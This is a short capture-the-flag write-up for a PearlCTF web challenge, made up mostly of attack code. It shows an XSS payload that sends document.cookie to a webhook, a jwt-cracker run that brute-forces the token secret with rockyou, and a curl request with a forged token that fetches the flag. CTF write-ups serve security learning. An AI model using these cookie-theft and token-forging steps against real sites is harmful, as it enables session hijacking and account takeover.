# web/learn HTTP
## get sample of token
```js
webhook = "??"
script = `<img src=x onerror="fetch('${webhook}?'+document.cookie)" />`
payload = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: "+script.length+"\r\n\r\n"+script

const urlencoded = new URLSearchParams();
urlencoded.append("body", payload);

fetch("https://learn-http.ctf.pearlctf.in/check", {
  method: "POST",
  headers: {"Content-Type":"application/x-www-form-urlencoded"},
  body: urlencoded,
})
```
## crack jwt
```shell
% jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTMzODUzfQ.aDP5hVVQQN2uFQL15oTBG1B83j8MnQu0f7IRxodKm24 -d wordlists/rockyou.txt 

SECRET FOUND: banana
Time taken (sec): 0.123
Total attempts: 20000
```
## sign new token as { "id": 2 } then get the flag!
```shell
biu2 ~ % curl 'https://learn-http.ctf.pearlctf.in/flag' \
-H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNzA5OTMzODUzfQ.QknwFnkloH7UHqCnVs8WPraD0hL_74qOobLXUzI18co'
```
`pearl{c4nt_s3nd_th3_resP0n53_w1th0ut_Sani7iz1ng}`